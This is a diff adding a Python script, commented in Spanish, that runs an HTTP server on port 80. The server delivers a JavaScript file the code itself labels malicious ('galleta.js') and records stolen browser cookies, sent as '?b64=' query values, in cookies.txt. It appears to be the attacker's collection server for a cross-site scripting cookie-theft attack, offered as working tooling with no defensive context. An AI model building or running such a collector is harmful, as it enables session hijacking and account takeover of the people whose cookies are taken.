@@ -1,0 +1,60 @@
+#!/usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+
+# Configuración del servidor
+host = '0.0.0.0'
+puerto = 80
+
+# Ruta del archivo de registro
+ruta_archivo_log = 'archivo_log.txt'
+
+# Ruta del archivo galleta.js (sin la carpeta /usr/bin)
+ruta_malicious_js = 'galleta.js'
+
+class ManejadorSolicitud(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Obtener el directorio actual
+        ruta_actual = os.getcwd()
+        
+        # Si la URL contiene el patrón específico, enviar el contenido de galleta.js
+        if self.path == f'/{ruta_malicious_js}':
+            try:
+                # Abrir el archivo galleta.js desde el directorio actual
+                with open(os.path.join(ruta_actual, ruta_malicious_js), 'rb') as archivo:
+                    contenido = archivo.read()
+                self.send_response(200)
+                self.send_header('Content-type', 'text/javascript')
+                self.end_headers()
+                self.wfile.write(contenido)
+            except FileNotFoundError:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b'Archivo no encontrado')
+        else:
+            # Responder con un código 200 OK para las solicitudes GET
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write('Solicitud GET recibida con éxito'.encode('utf-8'))
+
+            # Si la URL contiene una cookie
+            if '?b64=' in self.path:
+                cookie = self.path.split('?b64=')[1]
+                # Almacenar la cookie en un archivo en el directorio actual
+                ruta_cookies = os.path.join(ruta_actual, 'cookies.txt')
+                with open(ruta_cookies, 'a') as archivo_cookies:
+                    archivo_cookies.write(cookie + '\n')
+
+def iniciar_servidor():
+    server_address = (host, puerto)
+    httpd = HTTPServer(server_address, ManejadorSolicitud)
+    print(f'Servidor HTTP iniciado en http://{host}:{puerto}')
+
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('\nDeteniendo el servidor...')
+        httpd.server_close()
+
+if __name__ == '__main__':
+    iniciar_servidor()
